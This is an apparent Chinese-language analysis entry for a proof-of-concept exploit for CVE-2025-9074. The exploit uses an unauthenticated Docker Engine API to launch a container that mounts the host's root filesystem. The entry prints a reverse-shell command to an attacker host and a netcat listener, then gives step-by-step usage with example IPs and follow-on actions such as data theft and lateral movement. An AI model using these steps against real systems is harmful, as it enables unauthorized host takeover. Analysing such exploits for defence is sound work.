## CVE-2025-9074 - Docker Desktop 本地权限提升 (LPE)/API未授权访问

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 本地权限提升 (LPE)/API未授权访问

**影响应用:** Docker Desktop

**危害等级:** 高危

**CVSS评分:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**影响版本:** 未知

**利用条件:** 无需认证,需要网络访问

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 5%

## 详情

该POC脚本 `CVE-2025-9074.sh` 旨在利用Docker Desktop中的一个本地权限提升（LPE）漏洞。此漏洞的核心在于Docker Engine API在缺乏认证的情况下对外暴露，允许未授权的远程用户通过API进行操作。攻击者可以利用这一缺陷，在目标主机上创建并启动一个特权容器，从而获得对主机系统的完整控制权。该POC通过一系列`curl`命令与Docker Engine API交互，首先获取目标系统上已存在的Docker镜像列表，然后选择其中一个镜像。接着，它精心构造一个JSON payload，指示Docker Engine创建一个新容器。这个payload的关键在于配置了两个bind mount：针对Windows系统的`/mnt/host/c:/host_root_win`和针对Linux系统的`/:/host_root_nix`。这些挂载点将目标主机的根文件系统映射到新创建的容器内部。容器的启动命令被设置为执行一个反向shell (`bash -i >& /dev/tcp/LHOST/LPORT 0>&1`)，该shell会尝试连接回攻击者的指定监听IP和端口。一旦容器成功启动，攻击者即可获得目标主机的反向shell，从而实现远程代码执行和本地权限提升。

**POC有效性分析**：
该POC脚本逻辑清晰，步骤完整，旨在实现完整的漏洞利用。其有效性高度依赖于目标Docker Desktop环境的配置。如果Docker Engine API确实在没有认证的情况下暴露，并且可从网络访问，那么该POC将非常有效。通过将主机根目录挂载到容器内部，并执行反向shell，攻击者将获得与主机root/SYSTEM权限相当的控制权。脚本中明确列出了所需依赖（容器内需要`bash`，攻击者侧需要`curl`）并提供了清晰的用法示例，这表明其设计周全，易于复现和验证。整体而言，该POC是一个功能完整的利用脚本，能够有效证明并利用指定场景下的Docker Desktop LPE漏洞。

**利用步骤**：
1.  **准备监听器**：攻击者需在自己的机器上启动一个网络监听器，例如使用Netcat：`nc -lvnp <LPORT>` (例如 `nc -lvnp 9002`)，等待反向Shell连接。
2.  **获取POC脚本**：下载或创建名为`CVE-2025-9074.sh`的脚本文件。
3.  **识别目标信息**：确定运行Docker Desktop的目标主机的IP地址（`IP`）以及其Docker Engine API监听的端口（`PORT`，默认为2375或2376）。同时，确定攻击机的IP地址（`LHOST`）和监听端口（`LPORT`）。
4.  **执行POC**：在攻击机上执行脚本，并提供上述参数。例如：`sh CVE-2005-9074.sh 192.168.65.7 2375 10.10.14.73 9002`。
5.  **建立反向Shell**：脚本将通过未认证的Docker API在目标主机上创建一个特权容器，该容器会执行反向Shell命令，连接回攻击者的监听器。一旦连接成功，攻击者将获得目标主机的Shell访问权限，通常具有Root或Administrator权限。
6.  **后续操作**：获得Shell后，攻击者可执行任意命令、窃取敏感数据、部署恶意软件、进行横向移动等操作，实现对目标系统的全面控制。

**投毒风险分析**：
对`CVE-2025-9074.sh`脚本的投毒风险评估为低（约5%）。主要基于以下几点：
*   **代码透明度高**：脚本是标准的Bash Shell脚本，内容清晰，没有混淆或加密。所有执行的命令（主要是`curl`和`bash`）都直接在代码中可见，易于安全研究人员审查和理解其功能。
*   **无外部隐蔽下载**：脚本本身不包含从未知或可疑URL下载并执行其他二进制文件或脚本的代码。所有必要的组件都假定在目标系统或攻击机上已存在（例如`curl`）。
*   **恶意行为明确**：脚本的核心功能是建立一个反向Shell，这在渗透测试和漏洞利用场景中是标准的操作。`bash -i >& /dev/tcp/LHOST/LPORT 0>&1`是典型的反向Shell命令，用于证明漏洞的完整利用能力，而非隐藏的恶意载荷。它不属于“投毒代码”范畴，因为其意图是直接且公开的。
*   **自包含性**：脚本逻辑完全自包含，不依赖于复杂的第三方库或模块，因此引入供应链投毒的风险极低。
*   **提供清晰指引**：脚本开头明确提供了使用说明和依赖提示，包括启动监听器的要求，这符合合法安全研究工具的特点，旨在帮助用户正确安全地使用。

尽管该POC本身不含投毒代码，但其作为一种强大的LPE利用工具，如果落入恶意攻击者之手，则可能被滥用于未经授权的攻击。因此，在使用此类工具时，用户应始终从可信来源获取，并在隔离且受控的环境中进行测试，以防止任何意外或恶意利用。

**项目地址:** 未知

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-9074
